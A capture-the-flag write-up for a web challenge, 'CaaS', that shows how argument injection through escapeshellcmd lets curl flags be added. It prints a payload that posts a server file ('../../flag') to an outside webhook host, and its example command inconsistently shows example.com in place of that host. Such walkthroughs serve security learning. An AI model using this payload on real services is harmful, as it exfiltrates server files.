# CaaS

Challenge text:
```
cURL As A Service or CAAS is a brand new Alien application, built so that humans can test the status of their websites. However, it seems that the Aliens have not quite got the hang of Human programming and the application is riddled with issues.
```
Along with the [source code](web_caas).

The website is site where you can input any IP, and it'll curl the url. As we see in the source code, it does this by running `curl -sL escapeshellcmd($url);`. Since what you input is escaped, you can't pipe the input into anything or run multiple arbitrary commands. However, since all we had to do was read a file, w could use curl's `--data` flag to send a file with the request. There was a client-side check to determine if the inputted URL was actually a URL, but this could easily by bypassed for example using burp. By sending the request `--data @../../flag https://webhook.site/898d9834-4163-4815-84ab-41c3ddbe6d48`, the server would run `curl -sL --data @../../flag example.com`, and  we would get the flag.